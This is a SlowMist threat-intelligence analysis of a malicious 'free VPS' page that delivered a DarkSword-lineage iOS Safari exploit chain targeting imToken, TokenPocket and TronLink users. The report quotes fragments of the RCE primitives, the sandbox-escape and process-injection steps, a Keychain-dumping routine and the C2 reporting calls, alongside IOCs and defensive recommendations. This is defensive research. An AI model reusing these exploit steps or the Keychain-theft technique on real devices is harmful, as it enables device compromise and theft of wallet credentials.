@@ -1,0 +1,141 @@
+A campaign offering free VPS services was actually a decoy. A page recovered from a public web archive shows that event[.]polarnode[.]vip, registered in late August 2026, declared https[:]//lk[.]wyincc[.]com/lk.js as a preload script and automatically loaded it once the page became interactive, without requiring visitors to click.
+After decoding the saved loader sample, we confirmed that it targets iPhones running iOS 18.4–18.6.2 via Safari only, ultimately targeting file, Keychain, and keyboard input collection, with three wallet applications as its targets. This chain is highly consistent with the DarkSword iOS exploitation chain published by the Google Threat Intelligence Group (GTIG), corresponding to six CVEs and constituting n-day reuse.
+This analysis is based on the main loader sample at 1k[.]wyincc[.]com/lk[.]js and the snapshot of lk[.]wyincc[.]com/lk[.]js saved by urlscan. The analysis of the six CVEs and post-exploitation capabilities is limited to the /dist/sandbox.html chain.
+This technique is not an isolated case. A report published by socket.dev during the same period disclosed that 13 malicious Packagist themes used an exploitation chain from WebKit to the kernel to steal device data and wallet seed phrases, with overlaps between the CVEs used and those corresponding to DarkSword in this report.
+This analysis is based on static evidence. The samples were not executed, the iframe was not opened, and no response was passed to a browser or JavaScript engine. Remote downloads and synthesized C2 requests during the forensic investigation were conducted under separate authorization, and no real device data was sent. Descriptions of code capabilities in this article indicate that the corresponding implementation or invocation path exists in the code, and do not mean that the relevant operations have successfully occurred on a real device.
+MistEye is a Web3 threat intelligence and dynamic security monitoring system independently developed by SlowMist. It integrates security monitoring and intelligence aggregation capabilities to provide users with real-time risk alerts and asset protection.
+After receiving the sample, MistEye reconstructed the complete attack chain, from device screening and hidden iframe delivery to multi-stage exploitation and post-exploitation. It extracted the relevant domain, IP, and malicious file IOCs, integrated the malicious packages and IOCs into the threat detection engine, and issued risk alerts and response recommendations to relevant users.
+The following is a detailed technical analysis.
+The sample contains no line breaks and consists of a single line. Its obfuscation has three layers: a 1,025-item string array, an immediately invoked function that shifts the entire array at startup, and custom Base64 and RC4 applied to each string. The custom alphabet places lowercase letters before uppercase letters:
+abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=
+The SHA-256 of the decoded output is 38b43a6d27b08ff94a600fbe8182b4a2ba0eb744f68801a2d3454431f78e9fa5. The decoder only reads the text and performs its own Base64/RC4 transformations without evaluating any JavaScript.
+The plaintext reveals a fixed configuration: the server is https[:]//lk[.]wyincc[.]com, the preferred SDK endpoint is 13[.]248[.]210[.]49:36887, the fallback endpoint is 66[.]117[.]225[.]238:36887, the heartbeat interval is 20 seconds, device_source is 782391, and the client identifier is web-sdk V1.0. The configuration also contains an RSA public key, with SHA-256 85ec8a4c83463565b3a517b6ee9d010fbf6643c49a67245c64b27bd8a0e43681, which is later used to encrypt traffic sent to the SDK endpoints.
+Three target applications in the configuration are worth highlighting first: imToken (im.token.app), TokenPocket (com.global.wallet.ios), and TronLink (com.tronlink.hdwallet). The same set of identifiers appears again later in the keyboard collection task.
+The first thing the decoded code does is determine who should receive the payload. The 1k[.]wyincc[.]com loader sample analyzed in this article uses /iPhone OS (\d+)[_.](\d+)/i to parse navigator.userAgent. After the obfuscated arithmetic is simplified, the version check is equivalent to:
+if (major !== 18 || minor < 4 || minor > 6) return;
+In this loader sample, only iOS 18.4–18.6.x on an iPhone can pass the check. The browser check also requires Safari/, Version/, and Mobile/… Safari to be present, while excluding Chrome, Firefox, Opera, and Edge on iOS (CriOS, FxiOS, OPiOS, EdgiOS), as well as the embedded WebViews of WeChat, QQ, Telegram, Alipay, and a number of social and news applications. The regular expression only matches iPhone OS and does not match the CPU OS used by iPad.
+The loader snapshot actually referenced by the page saved by urlscan does not remove the above branch: iPhones running iOS 18.4–18.6.2 still proceed to /dist/sandbox.html. Compared with the loader sample analyzed in the main body, it also uses iPhone|iPod for global device matching, thereby including iPod touch, and adds a whitelist for iOS 15.2 to 17.1, handing these older versions and iPod touch over to an additional /group.html branch.
+Visitors who do not pass the screening are not simply ignored. The code hides all child elements of the current page and displays a multilingual prompt asking users to copy the address and open it in Safari. This is a compatibility prompt, while also actively directing visitors toward the browser environment required for the exploit.
+The following complete delivery chain analysis applies to the /dist/sandbox.html branch retained by both loaders. The loader snapshot actually referenced by the page additionally contains a parallel /group.html branch, but that path was blocked by the upstream WAF with HTTP 403, and its downstream content was not obtained in this analysis. Therefore, this article does not include this branch in the DarkSword lineage, the six CVEs, or the data collection capabilities described below.
+After an iPhone running iOS 18.4–18.6.2 passes the screening, the loader constructs a hidden iframe with the following fixed address template:
+https://lk.wyincc.com/dist/sandbox.html?d=<URL-encoded Base64 JSON>
+It has been confirmed that the configuration is passed from the initial loader to sandbox.html through the URL’s ?d= parameter. d contains URL-encoded Base64 JSON, including the current site’s origin, hostname, utm_source, session UID, as well as the SDK endpoint, RSA public key, device_source, and target wallet configuration. Because the UID and site fields are generated at runtime, there is no unique fixed third-stage URL that can be reconstructed in advance. To continue tracking the chain, we obtained sandbox.html under forensic conditions using the parameters reconstructed from the configuration.
+The iframe is kept off-screen and invisible using a piece of styling. The sandbox page then loads chunks/vendor.js through a dynamically created script element. vendor.js checks the version again and branches accordingly: for iOS 18.6, it downloads runtime.js and wraps it into a Blob Worker; for iOS 18.4 and 18.5, it downloads runtime-legacy.js, additionally retrieves and evals polyfill.js in the page. The legacy RCE path uses postMessage to pass between the page context and Worker context and synchronize the exploitation state, coordinating the establishment of RCE primitives and the handoff to subsequent stages; this is different from the pe_injected and chain_locked message listeners mentioned above, which are only responsible for execution lock/cooldown.
+Each subsequent stage is downloaded only after the preceding stage succeeds. The entire chain contains two layers of sandbox escape, identified in the code as SBX0 and SBX1: SBX0 moves execution from the web content process to the GPU process, while SBX1 then moves it from the GPU process to mediaplaybackd.
+// runtime.js (18.6) —— RCE primitives
+functionaddrof(object){ return BigInt.fromDouble(p_rce.addrof(object)) }
+functionfakeobj(addr){ return p_rce.fakeobj(addr.asDouble()) }
+// read32 / read64 / write8 / write64 are built on the same fakeobj/scribble mechanism
+// runtime.js —— SBX0 handoff (eval framework.js)
+print("[RCE] Starting to load SBX0 sandbox escape...");
+const sbx0_script = getJS("framework.js?" + Date.now());
+eval(sbx0_script)
+// framework.js —— SBX0 entry point
+print("[SBX0] ======== sbx0_main.js eval started ========");
+const { write8, read32, read64, write64, dlopen, dlsym, device_model, chipset } = p;
+// common.js —— mediaplaybackd XPC anchor and privilege escalation handoff for SBX1
+let XPC_ENDPOINT_REMAKER = "com.apple.coremedia.mediaplaybackd.remaker.xpc";
+remaker_connection = xpc_connection_create_mach_service(XPC_ENDPOINT_REMAKER, 0n, 0n);
+functionspawn_pe(){ LOG("Spawning PE...."); let pe_stage1_js_data_array = newUint8Array([...]); }
+// app.js —— kernel read/write and privilege escalation entry point
+let kernel_base = 0n; let kernel_slide = 0n; let is_a18_devices = false;
+functionpe_v1() { /* ... */ }
+Each of the three injection paths initiates a plaintext HTTP GET to retrieve a plugin, and then passes the response to the corresponding process:
+var inject = new InjectJS("SpringBoard", agentCode, migFilterBypass);
+if (inject.inject()) { ... }
+The three targets are SpringBoard (sync.js), securityd (auth.js), and kbd (input.js), respectively; the three recovered task scripts correspond to these three types of plugins and are coordinated by the code to inject the task agents. SBX0 SUCCEEDED and SBX1 SUCCEEDED in the code are status branch strings, not successful execution logs that we observed.
+One additional note regarding the source: lk[.]wyincc[.]com returned HTTP 403 for the legacy branch resources (runtime-legacy.js, polyfill.js, framework-legacy.js, common-legacy.js), so we obtained these four files from the associated payload hosting node at 1k[.]wyincc[.]com. This node had previously been verified to be byte-for-byte identical to the host actually referenced by the page for the shared vendor.js and runtime.js responses. However, we do not claim that these legacy files are byte-for-byte equivalent to the unavailable lk responses. The two conditional resources, powercuff_light.js and chain_status_overlay.js, returned 403 from the host actually referenced by the page and 404 HTML from the associated payload hosting node, so there were no analyzable scripts.
+There are several distinctive traces in the code that match a publicly documented tool. app.js contains the comment “If iOS >= 18.4 we apply migbypass in order to bypass autobox restrictions”, as well as the MigFilterBypass class, Chain.runPE() followed by Sandbox.applySandboxEscape(), deletion of the systemgroup.com.apple.osanalytics/DiagnosticReports/ directory, and a reference to the startSandworm tool. The version branches (18.4/18.5 and 18.6) and the stage responsibilities of SBX0 → SBX1 → PE are also consistent with the DarkSword analysis published by GTIG. Apple security advisories separately confirm the corresponding CVEs and fixed versions.
+The deobfuscated app.js retains several directly identifiable traces:
+// app.js —— migbypass version branching (DarkSword-specific comment)
+// If iOS >= 18.4 we apply migbypass in order to bypass autobox restrictions
+if (ver.major == 24 && ver.minor >= 4) { /* migbypass */ }
+// Chain kernel read/write wrappers embedded in MigFilterBypassThread.js
+staticrunPE() { /* ... */ }
+staticgetKernelBase() { /* ... */ }
+staticread(srcAddr, dst, len) { /* ... */ }
+staticwrite(dst, src, len) { /* ... */ }
+// startSandworm tool reference (retained in the source as a comment)
+// let baseKernel = startSandworm();
+Based on this, we map the local stages to the six CVEs:
+When GTIG first observed DarkSword, CVE-2025–43529, CVE-2026–20700, and CVE-2025–14174 were zero-days in the wild. As of the WYINCC campaign in September 2026, all six vulnerabilities have been publicly disclosed and patched by Apple. Therefore, the current delivery is an n-day reuse of the DarkSword six-vulnerability chain. The fixed versions and historical zero-day status are based on the GTIG report and Apple security advisories.
+To determine what the injected agents ultimately do, we sent minimal requestJsCode requests to both SDK endpoints under separate authorization, using a synthetic UID and empty site fields, with two requests to each endpoint in total. No device registration, heartbeat, Keychain, keyboard, or application data was sent during the entire process.
+The preferred endpoint 13[.]248[.]210[.]49:36887 returned a 54,773-byte response on both connection attempts; the fallback endpoint 66[.]117[.]225[.]238:36887 returned an empty response on both connection attempts. The responses were encrypted with AES-256-GCM and encapsulated in SSP2 frames. Using the saved session keys, we performed offline decryption, LZFSE decompression, and SSP2/JSON/Base64 validation, recovering three task scripts. None of the three tasks were executed.
+Each of the three tasks corresponds to one injected process:
+The SpringBoard task recursively enumerates files from application containers, shared AppGroups, or absolute paths according to the server-side apps_json configuration, uploads them in chunks, and includes a SHA-256 hash for each file as well as resumable uploads; when task_type is 1 or 4, it also Base64-decodes and evals JavaScript delivered by the server, then returns the result.
+The securityd task opens /private/var/Keychains/keychain-2.db, queries the genp and inet tables, and uses the private class SecDbKeychainItemV7 to decrypt data blobs, extracts v_Data, acct, svce, and agrp, and reports them.
+The kbd task monitors the foreground application; when a target wallet application is in the foreground, it polls the keyboard’s internal ivars (_inputString, _contextBeforeInput, _contextAfterInput), and reports the cached contents as reportAppPwd when input ends or the application switches.
+The securityd task corresponds to the auth.js plugin. app.js retrieves GET /dist/plugins/auth.js and injects the code into securityd via InjectJS(“securityd”, …), using the native calls established in the chain (dlsym, objc_msgSend) to directly invoke ObjC from JavaScript and open the Keychain database in read-only mode:
+sqlite3_open_v2("/private/var/Keychains/keychain-2.db", dbHandlePtr, SQLITE_OPEN_READONLY, 0)
+It only iterates through the genp (generic password) and inet (Internet password) tables (SELECT , filtered by agrp LIKE ‘%keyword%’, with a maximum of 500 rows per table; when the keyword is empty, it falls back to 1=1 to iterate through all entries). The data column is an encrypted BLOB. The code does not crack the keybag; instead, while already running inside securityd, it dynamically invokes methods of the private class SecDbKeychainItemV7 (such as initWithData:decryptionKeybag:error:) to decrypt the data, read the secret value v_Data, and extract acct, svce, and agrp:
+var tables = ["genp", "inet"];
+var cls = ncall("objc_getClass", _sp("SecDbKeychainItemV7"));
+task_type == 3 triggers a dump (with keywords sourced from the server-side apps_json or content); task_type == 4 can also extend collection by evaling server-delivered scripts. The results are reported via reportKeychain through a C2 channel encapsulated with SSP2 / AES-256-GCM / RSA:
+sendReport("reportKeychain", { keychain: b64, task_id: taskId || "" });
+We confirmed that this is an access-triggered, multi-stage exploitation and post-exploitation framework targeting iPhones running iOS 18.4–18.6.2 via Safari only, corresponding to the DarkSword lineage. The risk falls on three wallet applications — imToken, TokenPocket, and TronLink: the code has capabilities for browser RCE, two layers of sandbox escape, kernel read/write, and injecting agents into SpringBoard, securityd, and kbd, with collection targets covering files, Keychain, and keyboard input.
+All three in-the-wild zero-days observed by GTIG when it initially identified DarkSword had been publicly disclosed and patched by Apple by the time of this campaign. The current WYINCC delivery should therefore be characterized as an n-day reuse of the six-vulnerability chain. The loader snapshot actually referenced by the lk[.]wyincc[.]com page also contains a /group.html branch targeting older iOS versions and iPod touch, which was blocked by the upstream WAF with HTTP 403, and whose downstream content was not obtained. Therefore, the six CVEs and data collection conclusions apply only to the /dist/sandbox.html branch.
+1. Block the wyincc[.]com and polarnode[.]vip domains and the three 36887 endpoints at the network perimeter (proxy, DNS, EDR/NDR). Search logs for iPhone UAs running iOS 18.4–18.6.2 accessing paths such as /dist/sandbox.html, /dist/chunks/, and /dist/plugins/, and search for iOS 15.2 to 17.1 UAs (including possible iPod touch) accessing /group.html. The former indicates exposure to the known complete chain; the latter can only confirm that the visitor hit a downstream branch that was not obtained in this analysis, and the six CVEs or wallet data collection conclusions cannot be directly applied.
+2. If your own site was ever injected with this script, remove the script from the page and CDN/object storage caches, verify the source of its introduction through templates, tag managers, and advertising systems, and deploy CSP/SRI to restrict third-party scripts from inheriting the site’s context.
+3. Prioritize forensic investigation of iPhone devices that definitely accessed the delivery page and were running iOS 18.4–18.6.2 Safari, collecting Safari history, WebKit crashes, abnormal processes, and Keychain access records. For iPhone or iPod touch devices running iOS 15.2 to 17.1 that accessed /group.html, retain the same baseline evidence, but do not assert successful exploitation or data collection based solely on a path hit.
+4. For users of the following three target wallets: imToken, TokenPocket, and TronLink, determine whether to rotate credentials, revoke sessions, and monitor on-chain addresses and transactions based on the device forensic findings; do not assert that private keys or seed phrases have been compromised based solely on access records.
+5. Upgrade devices to Apple-patched versions (iOS/iPadOS 18.7.3 or 26.3 and above), and retain the original responses, session keys, and hashes for subsequent correlation analysis.
+1k[.]wyincc[.]com
+lk[.]wyincc[.]com
+event[.]polarnode[.]vip
+polarnode[.]vip
+13[.]248[.]210[.]49
+66[.]117[.]225[.]238
+166[.]117[.]225[.]238
+13[.]248[.]210[.]49:36887
+66[.]117[.]225[.]238:36887
+166[.]117[.]225[.]238:36887
+https[.]//lk[.]wyincc[.]com/lk.js
+https[.]//1k[.]wyincc[.]com/lk.js
+filename: lk.js
+SHA256: 89912ab03eb2d02746e52df7b17035082d973234f249098caec11684e665c337
+SHA256: 892dd644ea9a10fd4d89c54d6cfe1028487c3fc23d3f29723af9004b6edf8c70
+filename: sandbox.html
+SHA256: 953cfa9bf94304ad453eab706cd7cc92cde68eb6ea3c85652aa9040609e75f54
+filename: vendor.js
+SHA256: 52e2208a37c6dda971c9a67333dbcf526531745feb426a91ace9741ad178f510
+filename: runtime.js
+SHA256: a5ebcbd5c744865535dd75d8742c99bc06b548dc2606ac6f116843b54451f73b
+filename: runtime-legacy.js
+SHA256: afdb430bafc3c441ada98fe4a165fd1ad3a38ff5789517c5dd3f83a143706d53
+filename: polyfill.js
+SHA256: f0409f0d1c134be43dcd697b4715cca64efa66e482d252744163f552050cd236
+filename: framework.js
+SHA256: 78973b4d04cb6fee3c399937476347eca0aa9b99fa13596fe9dfaff829aba03b
+filename: framework-legacy.j
+SHA256: 36b43f98c7f4d2d5a0f14ce8a5bdfd2fc055f8628da4a2d9ece2402385447f1e
+filename: common.js
+SHA256: 69e357f06ee87ea934b328c4e701d1d48dcfcef51352bb61c64ef89424c029d8
+filename: common-legacy.js
+SHA256: 693af544eb4deb194f481a870f1202fefb0c278820bb23bced85cd354d29a63e
+filename: app.js
+SHA256: ab356a2bbdbb7f8e9327e10a2cf6d35ca0c4dbba06d982f559b00d13d31f3017
+filename: sync.js
+SHA256: 6eda3586102cf35ca53189accd2f56fec63a8adf74ccf93b59aed1e7651a690f
+filename: auth.js
+SHA256: 78406a0c68043df99cea87f280e8307675c285ca9d88f5a56aa9901c6f503d11
+filename: input.js
+SHA256: 3a2341a13a7c4854bc203be18eebd11f716e043540a91974ef6d6d12253f6c9d
+MistEye is a Web3 threat intelligence and dynamic security monitoring platform independently developed by SlowMist. Through its API, it provides malicious activity detection and supply chain risk alerting capabilities for the open-source package ecosystem.
+All malicious packages and IOCs involved in this campaign have been integrated into the MistEye threat detection engine. Developers can use the API to automatically scan project dependencies, quickly determine whether they match known malicious packages, and obtain response recommendations.
+📖 API Documentation: https://app.misteye.io/api-docs
+🛠️ MistEye-DepScan: https://github.com/slowmist/MistEye-DepScan
+A lightweight CLI tool that scans project dependencies and globally installed packages for known malicious packages with a single command. It supports the npm / PyPI / Cargo / Go / RubyGems ecosystems.
+🛠️ MistEye-Skills: https://github.com/slowmist/misteye-skills
+A security skill package for coding assistants that automatically triggers MistEye security checks before installing dependencies and accessing URLs.
+🛠️ MistEye-DNS-Guard: https://github.com/slowmist/MistEye-DNS-Guard
+A DNS security protection tool that detects malicious domains and risky access, identifying network threats such as phishing and C2.
+This article was written by the SlowMist Threat Intelligence Team based on the MistEye threat intelligence system and SlowMist Agent AI-powered analysis. If you have any questions, please feel free to contact us or provide feedback.
+[1] https://socket.dev/blog/packagist-themes-ios-spyware
+[2] https://cloud.google.com/blog/topics/threat-intelligence/darksword-ios-exploit-chain
+[3] https://support.apple.com/en-bw/125885
+[4] https://support.apple.com/en-me/125633
+[5] https://support.apple.com/en-us/126346
+[6] https://www.nodeseek.com/post-905477-1
+SlowMist is a threat intelligence firm focused on blockchain security, established in January 2018. The firm was started by a team with over ten years of network security experience to become a global force. Our goal is to make the blockchain ecosystem as secure as possible for everyone. We are now a renowned international blockchain security firm that has worked on various well-known projects such as HashKey Exchange, OSL, MEEX, BGE, BTCBOX, Bitget, BHEX.SG, OKX, Binance, HTX, Amber Group, Crypto.com, etc.
+SlowMist offers a variety of services that include but are not limited to security audits, threat information, defense deployment, security consultants, and other security-related services. We also offer AML (Anti-money laundering) software, MistEye (Security Monitoring), SlowMist Hacked (Crypto hack archives), FireWall.x (Smart contract firewall) and other SaaS products. We have partnerships with domestic and international firms such as Akamai, BitDefender, RC², TianJi Partners, IPIP, etc. Our extensive work in cryptocurrency crime investigations has been cited by international organizations and government bodies, including the United Nations Security Council and the United Nations Office on Drugs and Crime.
+By delivering a comprehensive security solution customized to individual projects, we can identify risks and prevent them from occurring. Our team was able to find and publish several high-risk blockchain security flaws. By doing so, we could spread awareness and raise the security standards in the blockchain ecosystem.
